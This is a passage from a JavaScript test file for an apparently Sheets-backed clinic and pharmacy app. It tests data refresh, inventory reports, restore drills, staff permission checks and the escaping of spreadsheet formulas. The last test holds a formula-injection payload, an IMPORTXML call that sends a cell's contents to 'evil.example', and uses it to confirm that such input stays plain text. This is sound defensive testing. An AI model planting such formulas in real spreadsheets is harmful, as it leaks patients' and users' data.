  assert.equal(t.staff({ action: 'getBills', before: d.loadedFrom }).bills.length, 0, 'staff never see old bills');
});

test('getAllData: unchanged data answers tiny; changes refresh it', () => {
  const t = setup();
  const d = t.all(t.owner); assert.ok(d.dataVersion);
  const u = t.owner({ action: 'getAllData', ifVersion: d.dataVersion });
  assert.equal(u.unchanged, true); assert.equal(u.medicines, undefined);
  assert.notEqual(t.staff({ action: 'getAllData', ifVersion: d.dataVersion }).unchanged, true, 'version is per role');
  t.staff(bill('BILL-8000000000071', [item(1001, 1, 10)]));
  assert.notEqual(t.owner({ action: 'getAllData', ifVersion: d.dataVersion }).unchanged, true);
});

// ═════════════════ REPORTS ═════════════════
test('inventory report: valuation, expiry loss, dead stock; batch history; report data for any period', () => {
  const t = setup();
  t.owner({ action: 'adjustStock', medicineId: '1002', type: 'EXPIRED', qty: 5, reason: 'expired strips' });
  t.owner({ action: 'adjustStock', medicineId: '1003', type: 'OPENING', qty: 5, reason: 'found in store room' });
  t.owner(bill('BILL-8000000000081', [item(1001, 10, 10)]));
  const r = t.owner({ action: 'getInventoryReport' });
  assert.equal(r.success, true, r.error);
  const para = r.medicines.find(m => m.id === '1001'), amox = r.medicines.find(m => m.id === '1002');
  assert.equal(para.sellable, 90); assert.equal(para.costValue, 360); assert.equal(para.saleValue, 900); assert.equal(para.sold30, 15, '5 on 1 Oct + 10 today'); assert.equal(para.dead, false);
  assert.equal(r.expiryLoss.total, 60, '5 × ₹12 cost'); assert.equal(Object.values(r.expiryLoss.byMonth)[0], 60);
  assert.equal(amox.dead, false, 'sold 25 days ago (bill from before the upgrade)'); assert.equal(amox.lastSale, '2026-10-02');
  assert.equal(r.medicines.find(m => m.id === '1003').dead, true, 'stock but no sale in 90 days');
  assert.equal(t.staff({ action: 'getInventoryReport' }).code, 'FORBIDDEN');
  const h = t.owner({ action: 'getBatchHistory', medicineId: '1001' });
  assert.equal(h.batches.length, 1); assert.equal(h.totals.SALE, -10);
  const rd = t.owner({ action: 'getReportData', from: '2025-01-01', to: today() });
  assert.equal(rd.success, true, rd.error);
  assert.ok(rd.bills.find(b => b.billId === 'BILL-1600000000001'), 'old data available for reports');
  assert.equal(rd.stockChanges.find(m => m.type === 'EXPIRED').value, -60);
  assert.match(t.owner({ action: 'getReportData', from: '2020-01-01', to: today() }).error, /3 years/);
});

// ═════════════════ HEALTH + RESTORE DRILL ═════════════════
test('health check and restore drill: a fresh backup gives identical app data', () => {
  const t = setup();
  t.owner(bill('BILL-8000000000091', [item(1001, 2, 10)], { paidAmount: 5 }));
  let h = t.owner({ action: 'healthCheck' });
  assert.equal(h.success, true);
  const byName = Object.fromEntries(h.checks.map(c => [c.name, c]));
  assert.equal(byName['Database tables up to date'].ok, true);
  assert.equal(byName['Daily backup scheduled'].ok, false, 'triggers not installed yet');
  assert.equal(byName['Restore drill passed'].ok, false);
  t.g.run('installTriggers');
  const d = t.owner({ action: 'restoreDrill' });
  assert.equal(d.success, true, d.error); assert.equal(d.drill.ok, true, JSON.stringify(d.drill.problems)); assert.ok(d.drill.cells > 100);
  h = t.owner({ action: 'healthCheck' });
  const c2 = Object.fromEntries(h.checks.map(c => [c.name, c]));
  assert.equal(c2['Restore drill passed'].ok, true); assert.equal(c2['Daily backup scheduled'].ok, true); assert.equal(c2['Recent verified backup'].ok, true);
  assert.equal(t.staff({ action: 'healthCheck' }).code, 'FORBIDDEN');
});

// ═════════════════ PERMISSIONS ═════════════════
test('staff cannot use any owner-only v3.1 action (checked on the server)', () => {
  const t = setup();
  ['cancelPayment', 'returnRefund', 'getCashClosings', 'saveSupplier', 'deleteSupplier', 'recordSupplierPayment', 'cancelSupplierEntry', 'getSupplierLedger',
    'addPurchaseInvoice', 'cancelPurchaseInvoice', 'uploadInvoiceAttachment', 'purchaseReturn', 'saveTreatment', 'deletePatientTreatment', 'deleteFollowUp',
    'getBatchHistory', 'getInventoryReport', 'getReportData', 'healthCheck', 'restoreDrill'].forEach(a => {
    assert.equal(t.staff({ action: a, id: 'x', reason: 'xxx' }).code, 'FORBIDDEN', a);
  });
  const d = t.all(t.staff);
  assert.equal(d.suppliers, undefined); assert.equal(d.purchaseInvoices, undefined);
  assert.ok(Array.isArray(d.receivables) && Array.isArray(d.treatmentMaster) && Array.isArray(d.followUps));
  assert.ok(t.rows('AuditLog').some(r => r[3] === 'returnRefund' && r[6] === 'DENIED'));
});

test('text that looks like a spreadsheet formula is stored as plain text, never run by Google Sheets', () => {
  const t = setup();
  const evil = '=IMPORTXML("https://evil.example/?"&A1,"//a")';
  assert.equal(t.owner({ action: 'savePatient', id: 'PT-F', name: evil, phone: '+91 98765 43210', notes: '- take after food', status: 'Active' }).success, true);
  assert.equal(t.owner({ action: 'saveExpense', id: 'EXP-F', date: today(), category: '@SUM(1)', amount: '5', vendor: '+cmd', notes: evil }).success, true);
  assert.equal(t.owner({ action: 'saveSupplier', name: evil }).success, true);
  assert.equal(t.owner({ action: 'saveSettings', settingKey: 'clinic_note', settingValue: '=1+1' }).success, true);
  assert.deepEqual(t.g.stats.formulas, [], 'no formula reached the sheet');
  const p = t.rows('Patients').find(r => r[0] === 'PT-F');
  assert.equal(p[1], evil, 'name reads back exactly as typed');
  assert.equal(p[2], '+91 98765 43210');
  // plain numbers stay numbers (a negative stock adjustment etc. is not turned into text)
  const { sheetText_ } = t.g.sandbox;
  assert.equal(sheetText_('-5'), '-5'); assert.equal(sheetText_(-5), -5); assert.equal(sheetText_('=A1'), "'=A1");
});
